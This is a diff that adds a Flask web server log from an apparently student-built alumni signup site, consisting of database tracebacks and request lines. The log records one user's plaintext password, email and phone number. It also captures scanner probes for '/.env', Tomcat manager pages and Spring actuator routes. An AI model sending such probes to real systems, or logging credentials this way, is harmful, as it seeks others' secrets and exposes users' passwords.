+    self._transaction.commit(_to_root=self.future)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 829, in commit
+    self._prepare_impl()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 808, in _prepare_impl
+    self.session.flush()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3386, in flush
+    self._flush(objects)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3526, in _flush
+    transaction.rollback(_capture_exception=True)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 72, in __exit__
+    with_traceback=exc_tb,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/compat.py", line 208, in raise_
+    raise exception
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3486, in _flush
+    flush_context.execute()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/unitofwork.py", line 456, in execute
+    rec.execute(self)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/unitofwork.py", line 633, in execute
+    uow,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/persistence.py", line 250, in save_obj
+    insert,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/persistence.py", line 1241, in _emit_insert_statements
+    execution_options=execution_options,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1705, in _execute_20
+    return meth(self, args_10style, kwargs_10style, execution_options)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/sql/elements.py", line 334, in _execute_on_connection
+    self, multiparams, params, execution_options
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1582, in _execute_clauseelement
+    cache_hit=cache_hit,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1944, in _execute_context
+    e, statement, parameters, cursor, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 2125, in _handle_dbapi_exception
+    sqlalchemy_exception, with_traceback=exc_info[2], from_=e
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/compat.py", line 208, in raise_
+    raise exception
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1901, in _execute_context
+    cursor, statement, parameters, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
+    cursor.execute(statement, parameters)
+sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: alumni
+[SQL: INSERT INTO alumni (name, password, email, indexnumber) VALUES (?, ?, ?, ?)]
+[parameters: ('Ebenmills ', 'central@123', 'eben@gmail.com', 'Int20013559')]
+(Background on this error at: https://sqlalche.me/e/14/e3q8)
+[pid: 17328|app: 0|req: 24/71] 154.160.22.71 () {50 vars in 1063 bytes} [Mon Oct 10 07:27:07 2022] POST /usersignup => generated 290 bytes in 127 msecs (HTTP/1.1 500) 4 headers in 173 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 25/72] 154.160.22.71 () {44 vars in 908 bytes} [Mon Oct 10 07:27:17 2022] GET /userlogin => generated 3140 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 26/73] 154.160.22.71 () {44 vars in 910 bytes} [Mon Oct 10 07:27:17 2022] GET /static/css/newstyle.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 175 bytes (0 switches on core 0)
+[pid: 17326|app: 0|req: 11/74] 154.160.22.71 () {44 vars in 969 bytes} [Mon Oct 10 07:27:17 2022] GET /static/img/user.jpeg => generated 0 bytes in 5 msecs (HTTP/1.1 304) 4 headers in 172 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 27/75] 154.160.22.71 () {44 vars in 915 bytes} [Mon Oct 10 07:27:32 2022] GET /useryeargroup => generated 262 bytes in 12 msecs (HTTP/1.1 302) 6 headers in 434 bytes (1 switches on core 0)
+try
+None
+None
+[pid: 17328|app: 0|req: 28/76] 154.160.22.71 () {44 vars in 1015 bytes} [Mon Oct 10 07:27:32 2022] GET /login?next=%2Fuseryeargroup => generated 1930 bytes in 25 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 18/77] 154.160.22.71 () {42 vars in 845 bytes} [Mon Oct 10 07:27:33 2022] GET /style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (2 switches on core 0)
+[pid: 17328|app: 0|req: 29/78] 154.160.22.71 () {44 vars in 924 bytes} [Mon Oct 10 07:27:33 2022] GET /static/css/stylee.css => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 173 bytes (0 switches on core 0)
+None
+None
+None
+[pid: 17327|app: 0|req: 19/79] 154.160.22.71 () {44 vars in 919 bytes} [Mon Oct 10 07:27:43 2022] GET /signup => generated 1862 bytes in 18 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 12/80] 154.160.22.71 () {44 vars in 903 bytes} [Mon Oct 10 07:27:44 2022] GET /static/css/stylee.css => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 173 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 30/81] 154.160.22.71 () {42 vars in 824 bytes} [Mon Oct 10 07:27:44 2022] GET /style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+0209548149
+eben@gmail.com
+Ebenmills 
+Success
+[2022-10-10 07:27:57,474] ERROR in app: Exception on /signup [POST]
+Traceback (most recent call last):
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1901, in _execute_context
+    cursor, statement, parameters, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
+    cursor.execute(statement, parameters)
+sqlite3.OperationalError: no such table: person
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 2073, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1518, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1516, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1502, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "./app.py", line 473, in signup
+    db.session.commit()
+  File "<string>", line 2, in commit
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 1451, in commit
+    self._transaction.commit(_to_root=self.future)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 829, in commit
+    self._prepare_impl()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 808, in _prepare_impl
+    self.session.flush()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3386, in flush
+    self._flush(objects)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3526, in _flush
+    transaction.rollback(_capture_exception=True)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/langhelpers.py", line 72, in __exit__
+    with_traceback=exc_tb,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/compat.py", line 208, in raise_
+    raise exception
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 3486, in _flush
+    flush_context.execute()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/unitofwork.py", line 456, in execute
+    rec.execute(self)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/unitofwork.py", line 633, in execute
+    uow,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/persistence.py", line 250, in save_obj
+    insert,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/persistence.py", line 1241, in _emit_insert_statements
+    execution_options=execution_options,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1705, in _execute_20
+    return meth(self, args_10style, kwargs_10style, execution_options)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/sql/elements.py", line 334, in _execute_on_connection
+    self, multiparams, params, execution_options
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1582, in _execute_clauseelement
+    cache_hit=cache_hit,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1944, in _execute_context
+    e, statement, parameters, cursor, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 2125, in _handle_dbapi_exception
+    sqlalchemy_exception, with_traceback=exc_info[2], from_=e
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/compat.py", line 208, in raise_
+    raise exception
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1901, in _execute_context
+    cursor, statement, parameters, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
+    cursor.execute(statement, parameters)
+sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: person
+[SQL: INSERT INTO person (name, "yearCompleted", nationality, contact, faculty, hallofresidence, password, email, phone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)]
+[parameters: ('Ebenmills ', None, None, None, None, None, 'central@123', 'eben@gmail.com', '0209548149')]
+(Background on this error at: https://sqlalche.me/e/14/e3q8)
+[pid: 17328|app: 0|req: 31/82] 154.160.22.71 () {50 vars in 1051 bytes} [Mon Oct 10 07:27:57 2022] POST /signup => generated 290 bytes in 11 msecs (HTTP/1.1 500) 4 headers in 173 bytes (1 switches on core 0)
+try
+None
+None
+[pid: 17327|app: 0|req: 20/83] 154.160.22.71 () {44 vars in 896 bytes} [Mon Oct 10 07:28:01 2022] GET /login => generated 1687 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 298 bytes (2 switches on core 0)
+[pid: 17328|app: 0|req: 32/84] 154.160.22.71 () {44 vars in 902 bytes} [Mon Oct 10 07:28:01 2022] GET /static/css/stylee.css => generated 0 bytes in 5 msecs (HTTP/1.1 304) 4 headers in 173 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 33/85] 154.160.22.71 () {42 vars in 823 bytes} [Mon Oct 10 07:28:01 2022] GET /style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (2 switches on core 0)
+try
+eben@gmail.com
+central@123
+form Validated successfully
+[2022-10-10 07:28:15,249] ERROR in app: Exception on /login [POST]
+Traceback (most recent call last):
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1901, in _execute_context
+    cursor, statement, parameters, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
+    cursor.execute(statement, parameters)
+sqlite3.OperationalError: no such table: person
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 2073, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1518, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1516, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/testbuser/Projects/myrproject/venv/lib/python3.6/site-packages/flask/app.py", line 1502, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "./app.py", line 445, in login
+    user = Person.query.filter_by(email = form.email.data).first()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/query.py", line 2823, in first
+    return self.limit(1)._iter().first()
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/query.py", line 2910, in _iter
+    execution_options={"_sa_orm_load_options": self.load_options},
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/orm/session.py", line 1712, in execute
+    result = conn._execute_20(statement, params or {}, execution_options)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1705, in _execute_20
+    return meth(self, args_10style, kwargs_10style, execution_options)
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/sql/elements.py", line 334, in _execute_on_connection
+    self, multiparams, params, execution_options
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1582, in _execute_clauseelement
+    cache_hit=cache_hit,
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1944, in _execute_context
+    e, statement, parameters, cursor, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 2125, in _handle_dbapi_exception
+    sqlalchemy_exception, with_traceback=exc_info[2], from_=e
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/util/compat.py", line 208, in raise_
+    raise exception
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/base.py", line 1901, in _execute_context
+    cursor, statement, parameters, context
+  File "/home/testbuser/Projects/myrproject/venv/lib64/python3.6/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
+    cursor.execute(statement, parameters)
+sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such table: person
+[SQL: SELECT person.id AS person_id, person.name AS person_name, person."yearCompleted" AS "person_yearCompleted", person.nationality AS person_nationality, person.contact AS person_contact, person.faculty AS person_faculty, person.hallofresidence AS person_hallofresidence, person.password AS person_password, person.email AS person_email, person.phone AS person_phone 
+FROM person 
+WHERE person.email = ?
+ LIMIT ? OFFSET ?]
+[parameters: ('eben@gmail.com', 1, 0)]
+(Background on this error at: https://sqlalche.me/e/14/e3q8)
+[pid: 17325|app: 0|req: 14/86] 154.160.22.71 () {50 vars in 1048 bytes} [Mon Oct 10 07:28:15 2022] POST /login => generated 290 bytes in 106 msecs (HTTP/1.1 500) 4 headers in 173 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 34/87] 183.136.225.35 () {34 vars in 461 bytes} [Mon Oct 10 07:53:36 2022] GET / => generated 5013 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 21/88] 183.136.225.35 () {36 vars in 521 bytes} [Mon Oct 10 08:06:22 2022] GET / => generated 5013 bytes in 6 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 22/89] 183.136.225.35 () {36 vars in 544 bytes} [Mon Oct 10 08:06:23 2022] GET /favicon.ico => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 13/90] 183.136.225.35 () {36 vars in 542 bytes} [Mon Oct 10 08:06:24 2022] GET /robots.txt => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 14/91] 159.138.122.77 () {34 vars in 486 bytes} [Mon Oct 10 08:17:22 2022] GET / => generated 5013 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 35/92] 31.220.1.83 () {34 vars in 442 bytes} [Mon Oct 10 08:22:10 2022] GET / => generated 5013 bytes in 8 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 36/93] 209.141.33.65 () {46 vars in 784 bytes} [Mon Oct 10 08:37:18 2022] GET / => generated 5013 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 37/94] 209.141.33.65 () {46 vars in 806 bytes} [Mon Oct 10 08:37:23 2022] GET /favicon.ico => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (2 switches on core 0)
+[pid: 17328|app: 0|req: 38/95] 80.94.92.239 () {44 vars in 781 bytes} [Mon Oct 10 09:45:39 2022] GET / => generated 5013 bytes in 18 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 8/96] 45.61.185.198 () {40 vars in 673 bytes} [Mon Oct 10 10:16:50 2022] GET /config/getuser?index=0 => generated 232 bytes in 11 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 23/97] 80.94.92.231 () {28 vars in 311 bytes} [Mon Oct 10 10:35:27 2022] GET / => generated 5013 bytes in 17 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17328|app: 0|req: 39/98] 154.160.17.80 () {40 vars in 655 bytes} [Mon Oct 10 10:47:39 2022] GET / => generated 5013 bytes in 25 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17327|app: 0|req: 24/99] 154.160.17.80 () {44 vars in 840 bytes} [Mon Oct 10 10:47:40 2022] GET /static/css/land.css => generated 0 bytes in 6 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 25/100] 154.160.17.80 () {44 vars in 895 bytes} [Mon Oct 10 10:47:40 2022] GET /static/img/mastercard.png => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 177 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 26/101] 154.160.17.80 () {44 vars in 881 bytes} [Mon Oct 10 10:47:40 2022] GET /static/img/mkk.png => generated 0 bytes in 5 msecs (HTTP/1.1 304) 4 headers in 170 bytes (0 switches on core 0)
+[pid: 17324|app: 0|req: 9/102] 154.160.17.80 () {44 vars in 883 bytes} [Mon Oct 10 10:47:40 2022] GET /static/img/visa.png => generated 0 bytes in 7 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+[pid: 17325|app: 0|req: 15/103] 154.160.17.80 () {44 vars in 907 bytes} [Mon Oct 10 10:47:40 2022] GET /static/img/Central-Uni-logo.png => generated 0 bytes in 21 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 27/104] 154.160.17.80 () {44 vars in 907 bytes} [Mon Oct 10 10:47:40 2022] GET /static/img/2000px-Apple_Pay.png => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 183 bytes (0 switches on core 0)
+[pid: 17327|app: 0|req: 28/105] 154.160.17.80 () {42 vars in 765 bytes} [Mon Oct 10 10:47:40 2022] GET /style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 40/106] 154.160.17.80 () {44 vars in 887 bytes} [Mon Oct 10 10:47:41 2022] GET /static/img/qrcode.png => generated 0 bytes in 5 msecs (HTTP/1.1 304) 4 headers in 173 bytes (0 switches on core 0)
+[pid: 17328|app: 0|req: 41/107] 154.160.17.80 () {44 vars in 883 bytes} [Mon Oct 10 10:47:41 2022] GET /static/img/gpay.png => generated 0 bytes in 4 msecs (HTTP/1.1 304) 4 headers in 171 bytes (0 switches on core 0)
+try
+None
+None
+[pid: 17328|app: 0|req: 42/108] 154.160.23.103 () {42 vars in 743 bytes} [Mon Oct 10 11:09:37 2022] GET /login => generated 1687 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 298 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 43/109] 154.160.23.103 () {42 vars in 824 bytes} [Mon Oct 10 11:09:38 2022] GET /style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 29/110] 154.160.23.103 () {36 vars in 598 bytes} [Mon Oct 10 11:09:38 2022] GET /favicon.ico => generated 232 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 30/111] 13.58.102.180 () {40 vars in 569 bytes} [Mon Oct 10 11:17:39 2022] GET / => generated 5013 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17326|app: 0|req: 15/112] 157.230.30.241 () {34 vars in 526 bytes} [Mon Oct 10 11:39:33 2022] GET / => generated 5013 bytes in 15 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17326|app: 0|req: 16/113] 109.206.241.59 () {36 vars in 592 bytes} [Mon Oct 10 11:47:10 2022] GET /.env => generated 232 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 31/114] 109.206.241.59 () {40 vars in 699 bytes} [Mon Oct 10 11:47:10 2022] POST / => generated 178 bytes in 12 msecs (HTTP/1.1 405) 4 headers in 155 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 17/115] 81.163.62.237 () {32 vars in 466 bytes} [Mon Oct 10 11:47:30 2022] GET / => generated 5013 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 18/116] 103.149.192.51 () {34 vars in 490 bytes} [Mon Oct 10 11:48:54 2022] GET / => generated 5013 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 32/117] 64.20.56.82 () {34 vars in 523 bytes} [Mon Oct 10 13:05:49 2022] GET /game/zhuce/index.php => generated 232 bytes in 9 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 33/118] 45.61.185.198 () {40 vars in 673 bytes} [Mon Oct 10 13:39:49 2022] GET /config/getuser?index=0 => generated 232 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 119 bytes (2 switches on core 0)
+[pid: 17324|app: 0|req: 10/119] 65.141.6.170 () {36 vars in 524 bytes} [Mon Oct 10 15:23:18 2022] GET /.env => generated 232 bytes in 14 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 19/120] 65.141.6.170 () {40 vars in 631 bytes} [Mon Oct 10 15:23:19 2022] POST / => generated 178 bytes in 12 msecs (HTTP/1.1 405) 4 headers in 155 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 44/121] 109.237.97.204 () {36 vars in 526 bytes} [Mon Oct 10 15:33:27 2022] GET /.env => generated 232 bytes in 15 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 20/122] 45.61.185.198 () {40 vars in 673 bytes} [Mon Oct 10 16:26:25 2022] GET /config/getuser?index=0 => generated 232 bytes in 10 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 45/123] 192.241.214.71 () {34 vars in 430 bytes} [Mon Oct 10 16:34:04 2022] GET /manager/text/list => generated 232 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 46/124] 34.77.127.183 () {42 vars in 564 bytes} [Mon Oct 10 16:42:07 2022] GET / => generated 5013 bytes in 10 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17328|app: 0|req: 47/125] 43.131.66.209 () {32 vars in 360 bytes} [Mon Oct 10 16:58:17 2022] GET / => generated 5013 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 21/126] 192.241.219.240 () {34 vars in 421 bytes} [Mon Oct 10 17:25:36 2022] GET /manager/html => generated 232 bytes in 12 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 22/127] 81.70.9.83 () {34 vars in 383 bytes} [Mon Oct 10 17:29:39 2022] GET / => generated 5013 bytes in 9 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 48/128] 45.61.185.198 () {40 vars in 673 bytes} [Mon Oct 10 18:04:30 2022] GET /config/getuser?index=0 => generated 232 bytes in 8 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 23/129] 159.203.62.246 () {34 vars in 396 bytes} [Mon Oct 10 18:25:23 2022] GET / => generated 5013 bytes in 5 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17327|app: 0|req: 34/130] 80.94.92.231 () {28 vars in 311 bytes} [Mon Oct 10 18:54:45 2022] GET / => generated 5013 bytes in 21 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 35/131] 128.14.141.34 () {34 vars in 489 bytes} [Mon Oct 10 19:30:52 2022] GET / => generated 5013 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17324|app: 0|req: 11/132] 128.199.53.87 () {34 vars in 395 bytes} [Mon Oct 10 19:56:17 2022] GET / => generated 5013 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 49/133] 152.89.196.211 () {34 vars in 558 bytes} [Mon Oct 10 21:16:22 2022] GET /?XDEBUG_SESSION_START=phpstorm => generated 5013 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 50/134] 162.142.125.9 () {28 vars in 312 bytes} [Mon Oct 10 21:17:30 2022] GET / => generated 5013 bytes in 7 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 24/135] 162.142.125.9 () {34 vars in 444 bytes} [Mon Oct 10 21:17:30 2022] GET / => generated 5013 bytes in 16 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 36/136] 162.142.125.9 () {34 vars in 472 bytes} [Mon Oct 10 21:17:31 2022] GET /favicon.ico => generated 232 bytes in 9 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17327|app: 0|req: 37/137] 152.89.196.211 () {34 vars in 545 bytes} [Mon Oct 10 22:20:43 2022] GET /actuator/gateway/routes => generated 232 bytes in 15 msecs (HTTP/1.1 404) 3 headers in 119 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 51/138] 80.94.92.239 () {44 vars in 781 bytes} [Mon Oct 10 22:55:34 2022] GET / => generated 5013 bytes in 16 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17326|app: 0|req: 25/139] 71.6.232.20 () {34 vars in 487 bytes} [Mon Oct 10 23:27:48 2022] GET / => generated 5013 bytes in 30 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 52/140] 80.94.92.239 () {44 vars in 781 bytes} [Mon Oct 10 23:33:53 2022] GET / => generated 5013 bytes in 18 msecs (HTTP/1.1 200) 5 headers in 278 bytes (2 switches on core 0)
+[pid: 17326|app: 0|req: 26/141] 80.94.92.239 () {44 vars in 781 bytes} [Tue Oct 11 00:36:08 2022] GET / => generated 5013 bytes in 27 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
+[pid: 17328|app: 0|req: 53/142] 18.224.212.249 () {40 vars in 570 bytes} [Tue Oct 11 00:36:18 2022] GET / => generated 5013 bytes in 12 msecs (HTTP/1.1 200) 5 headers in 278 bytes (1 switches on core 0)
